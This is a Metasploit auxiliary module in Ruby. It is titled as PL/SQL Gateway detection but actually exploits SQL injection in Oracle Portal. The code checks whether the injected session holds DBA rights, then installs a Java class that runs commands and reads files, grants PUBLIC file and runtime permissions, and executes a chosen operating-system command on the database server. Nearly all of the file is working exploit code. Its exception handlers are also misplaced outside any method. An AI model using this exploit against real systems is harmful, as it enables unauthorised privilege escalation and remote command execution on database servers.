##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'Oracle Application PL/SQL Gateway Detection',
			'Version'     => '$Revision:  $',
			'Description' => 'Oracle Portal Privilege Escalation. Tries various privilege escalation exploits against oracle portal\'s that are vulnerable to sql injection in an attempt to escalate the current portal user to DBA',
			'Author'      => 'CG' ,
			'License'     => MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://www.owasp.org/index.php/Testing_for_Oracle' ]
				]
		)
		register_options(
			[
				OptString.new('URIPATH', [ true,  "The URI PATH", '/pls/']),
				OptString.new('DAD', [ true,  "The Database Access Descriptor", 'portal/']),
				OptString.new('INJECTION', [ true,  "The vulnerable injection package", 'PORTAL.WWV_HTP.CENTERCLOSE']),
				OptString.new('COMMAND', [ true,  "The command to run", 'ipconfig']),
				OptBool.new('VERIFY', [ true, 'Verify URL and DBA Status', TRUE ]),
				OptBool.new('JAVASETUP', [ true, 'Set up java libs and command function', TRUE ]),
			], self.class)
	end

	
	
	#Check DBA Function
	def check_dba(rhost,rport,path,dad,injection,url_dba)
		dba = false
		sql_check_priv = "select+\'my\'||\'veeryv3ry\'||\'rand0mt3xt\'+from+sys.user\$+where+rownum=1"
		print_status("Checking if we are DBA  on: \n#{rhost}:#{rport}#{path}#{dad}#{injection}#{url_dba}#{sql_check_priv}\n")
		
		res = send_request_raw({
			'uri' => path + dad + injection + url_dba + sql_check_priv, 
			'method' => 'GET'
				}, 10)

		if (res.nil?)
			print_error("No response for #{rhost}:#{rport}")
		elsif (res.code == 200)
			if (res.body =~ /myveeryv3ryrand0mt3xt/i )
				print_good("We are DBA, now set VERIFY to false to continue")
				dba = true
			else
				print_error("We are not DBA")
				dba = false
			end
		elsif(res.code == 302 or res.code == 301)
		  print_status("Redirect to #{res.headers['Location']}")
		  dba = false
		else
			print_status("Received #{res.code} for request")
			print_error("We are not DBA")
			dba = false
		end	
		return dba
	end
	
	def do_exploit(rhost,rport,path,dad,injection,url_code,cmd)
		print_status("Setting up the java libraries to run commands: #{rhost}:#{rport}#{path}#{dad}#{injection}#{url_code}#{cmd}")
					
		res = send_request_raw({
			'uri' => path + dad + injection + url_code + cmd,
			'method' => 'GET'
				}, 10)

		if (res.nil?)
			print_error("No response for #{rhost}:#{rport}")
		elsif (res.code == 200)
			print_good("Received #{res.code} for request,looks like the command took")
		elsif(res.code == 302 or res.code == 301)
			print_status("Redirect to #{res.headers['Location']}")
		else
			print_status("Received #{res.code} for request")
			print_status("It probably didnt work")
		end
			
		#wait 2 seconds for oracle to realize it just got owned
		select(nil,nil,nil,2.0)
		print_status("Waiting a bit for caching to catch up")
		select(nil,nil,nil,2.0)
	end
	
	#only difference is we want to return the body of the page for the commands now
	def do_runcmd(rhost,rport,path,dad,injection,url_dba,cmd_call)
		print_status("Trying to run our command #{rhost}:#{rport}#{path}#{dad}#{injection}#{url_dba}#{cmd_call}")
					
		res = send_request_raw({
			'uri' => path + dad + injection + url_dba + cmd_call,
			'method' => 'GET'
				}, 10)

		if (res.nil?)
			print_error("No response for #{rhost}:#{rport}")
		elsif (res.code == 200)
			print_status("Received #{res.code}")
			print_status("Request Body: #{res.body}")
		elsif(res.code == 302 or res.code == 301)
			print_status("Redirect to #{res.headers['Location']}")
		else
			print_status("Received #{res.code} for request")
			
		end
			
	end
	
	def run
		javalib = "create%20or%20replace%20and%20compile%20java%20source%20named%20%22LinxUtil%22%20as%20import%20java.io.*;%20public%20class%20LinxUtil%20extends%20Object%20%7Bpublic%20static%20String%20runCMD(String%20args)%20%7Btry%7BBufferedReader%20myReader=%20new%20BufferedReader(new%20InputStreamReader(%20Runtime.getRuntime().exec(args).getInputStream()%20)%20);%20String%20stemp,str=%22%22;while%20((stemp%20=%20myReader.readLine())%20!=%20null)%20str%20%2b=stemp%2b%22%5Cn%22;myReader.close();return%20str;%7D%20catch%20(Exception%20e)%7Breturn%20e.toString();%7D%7Dpublic%20static%20String%20readFile(String%20filename)%7Btry%7BBufferedReader%20myReader=%20new%20BufferedReader(new%20FileReader(filename));%20String%20stemp,str=%22%22;while%20((stemp%20=%20myReader.readLine())%20!=%20null)%20str%20%2b=stemp%2b%22%5Cn%22;myReader.close();return%20str;%7D%20catch%20(Exception%20e)%7Breturn%20e.toString();%7D%7D%7D"
		
		javaperm = "begin%20dbms_java.grant_permission('PUBLIC',%20'SYS:java.io.FilePermission',%20'%3C%3CALL%20FILES%3E%3E',%20'read,write,execute');DBMS_JAVA.grant_permission%20('PUBLIC',%20'SYS:java.lang.RuntimePermission','writeFileDescriptor',%20'');end;"
		
		cmd_exec_func = "create%20or%20replace%20function%20LinxRunCMD(p_cmd%20in%20varchar2)%20return%20varchar2%20as%20language%20java%20name%20'LinxUtil.runCMD(java.lang.String)%20return%20String';"
		
		sql_currentuser = "select+user+from+dual"
		sql_currentuserpriv = "select+\*+from+user_role_privs"
		sql_check = "select+'my'||'veeryv3ry'||'rand0mt3xt'+from+dual";
		sql_check_priv = "select+'my'||'veeryv3ry'||'rand0mt3xt'+from+sys.user\$+where+rownum=1";
		url_code = "?);execute+immediate+:1;--="
		url_dba = "?);OWA_UTIL.CELLSPRINT(:1);--=";

		dba = false

		path = datastore['URIPATH']
		dad = datastore['DAD']
		injection = datastore['INJECTION']
		command = datastore['COMMAND']
		cmd_call = "select%20LinxRunCMD(\'#{command}\')%20from%20dual"
		
		if datastore['VERIFY']
		#check if the injection string is valid
			print_status("Checking if the URL is valid #{rhost}:#{rport}#{path}#{dad}#{injection}#{url_dba}#{sql_check}")
			
			res = send_request_raw({
				'uri' => path + dad + injection + url_dba + sql_check, 
				'method' => 'GET' 
					}, 10)

			if (res.nil?)
				print_error("No response for #{rhost}:#{rport}")
			return
			elsif (res.code == 200)
				if (res.body =~ /myveeryv3ryrand0mt3xt/i )
					print_good("URL is valid, continuing")
				else
					print_status("URL if invalid, exiting check your settings")
					return
				end
			elsif(res.code == 302 or res.code == 301)
				print_status("Redirect to #{res.headers['Location']}")	
			else
				print_status("Received #{res.code} for request")
				print_status("URL if invalid, exiting check your settings")
				return
			end

			#Check if we are DBA before we do our stuff
			dba = check_dba(rhost,rport,path,dad,injection,url_dba)
			if dba == true
				return
			end
		elsif datastore['JAVASETUP']
			#just do the java cmd stuff
			
			#create the java library
			do_exploit(rhost,rport,path,dad,injection,url_code,javalib)
			select(nil,nil,nil,5.0)
			
			#grant javasyspriv
			do_exploit(rhost,rport,path,dad,injection,url_code,javaperm)
			select(nil,nil,nil,5.0)
		
			#create the command function
			do_exploit(rhost,rport,path,dad,injection,url_code,cmd_exec_func)
			select(nil,nil,nil,5.0)
		
			#run the command
			do_runcmd(rhost,rport,path,dad,injection,url_dba,cmd_call)
		else
			do_runcmd(rhost,rport,path,dad,injection,url_dba,cmd_call)
		end

	end	
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
end
